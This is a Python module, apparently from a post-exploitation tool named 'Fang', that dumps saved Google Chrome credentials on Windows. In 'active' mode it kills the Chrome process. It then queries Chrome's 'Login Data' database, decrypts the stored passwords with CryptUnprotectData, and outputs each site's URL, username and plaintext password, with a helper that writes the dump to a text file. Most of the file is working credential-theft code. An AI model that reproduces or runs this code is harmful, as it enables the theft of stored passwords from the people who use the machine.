# -*- coding: utf-8 -*-


# Based on original work from: www.dumpzilla.org

import os
import csv
import sys
import json
import psutil
import sqlite3

from time import  sleep
from shutil import copy
from termcolor import colored
from win32crypt import CryptUnprotectData
from subprocess import check_output, PIPE, Popen

#try:
#	import config
#except:
#	from config import drop_type

#try:
#    print (config.drop_type)
#    print ('The first')
#except:
#    print (drop_type)
#    print ('The second')

#----------Color Codex------------|
ERROR= colored('[-] ','red')     #|
SUCCESS= colored('[+] ','green') #|
NOTICE= colored('[!] ','yellow') #|
WAITING= colored('[?] ','blue')  #|
MAYBE= colored('[=] ','cyan')    #|
MAYBE2= colored(' [=]','cyan')   #|



# Google Chrome Dump.

#task =str.encode('tasklist')

SUCCESS= colored('[+] ','green')
ERROR= colored('[-] ','red')
DONE= colored('[*] ', 'cyan')

# //////////// Output text file writer.
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
def txt_output_method(raw_msg):
    print (WAITING+'Extracting encrypted mozilla credentials....')
    sleep(0.8)
    print (WAITING+'Decrypting mozilla credentials....')
    sleep(0.8)
    print (WAITING+'Writting to text file....')

    if os.path.isfile('Fang-[Mozilla Pass].txt'):
        with open('Fang-[Mozilla Pass].txt','w') as txt_output:
            txt_output.write(raw_msg.strip())
               
    else :
        with open('Fang-[Mozilla Pass].txt','w') as txt_output:
            txt_output.write(raw_msg.strip())

    sleep (0.8)
    print ('\n')
    print(SUCCESS+"Data written to Fang-[Mozilla Pass].txt")
 #------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   


def check():
	processes= str(psutil.process_iter())
	if 'chrome.exe' in processes:
		return True

def chromedump(arg):
    try:
        #arg = arg.split(' ', 1)[1]
        msg = ''
        raw_msg= ''

        if arg == 'active':
            os.system('taskkill /f /im chrome.exe')
            msg += SUCCESS+'Killed chrome process\n\n'
            raw_msg += ' \n\nKilled chrome process\n\n.'
        elif arg == 'passive':
            #if 'chrome.exe' in check_output('tasklist'):
            if check()== 'True':
                #print(ERROR+'Chrome is currently running, this module will not do anything until chrome stops')
               #return
               pass
        else:
            #raise IndexError
            #return
            pass
        info_list = []
        connection = sqlite3.connect(os.getenv('localappdata') + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\' + 'Login Data')
        with connection:
            cursor = connection.cursor()
            v = cursor.execute(
                'SELECT action_url, username_value, password_value FROM logins')
            value = v.fetchall()
        for origin_url, username, password in value:    
            password = CryptUnprotectData(
                password, None, None, None, 0)[1]
            if password:
                info_list.append({
                    u'origin_url': origin_url,
                    u'username': username,
                    u'password': bytes.decode(password)
                })
        boundry= colored('| ---- | ','red')
        Username= colored('Username: ','cyan')
        urlss= colored('URL     : ','green')
        password= colored('Password: ','cyan')
        msg += colored('<[--Dumped-Passwords-<<Chrome>>--]>\n======================================= \n','green')
        raw_msg += '<[--Dumped-Passwords-<<Chrome>>--]>\n======================================= \n'
        if not info_list:
            msg += '\n%sNo passwords present'% ERROR
            raw_msg += '\nNo passwords present'
        else:
            for creds in info_list:
                msg += u'\n{} {} {}' .format(boundry, urlss, creds['origin_url'])#.encode('ascii','ignore'))
                msg += u'\n{} {} {}' .format(boundry, Username, creds['username'])#.encode('ascii','ignore'))
                msg += u'\n{} {} {}' .format(boundry, password, creds['password'])#.encode('ascii','ignore'))
                msg += u'\n{}'.format(boundry)
       
                raw_msg += u'\n| ---- | URL     : {}'.format(creds['origin_url'])#.encode('ascii','ignore'))
                raw_msg += u'\n| ---- | Username: {}'.format(creds['username'])#.encode('ascii','ignore'))
                raw_msg += u'\n| ---- | Password: {}'.format(creds['password'])#.encode('ascii','ignore'))
                raw_msg += u'\n| ---- | '
        #if 'plain' in config.drop_type:
        #    print (msg)
        #    return
        #elif 'txt' in config.drop_type:
        #    txt_output_method(raw_msg)
        #    return
            #print (raw_msg)

        return (msg)
       

    except Exception as crm_erro:
        print ('\n')
        print (ERROR+'Unable to recover chrome credentials\nReason: {}'.format(str(crm_erro)))

# Options ['active'/'passive']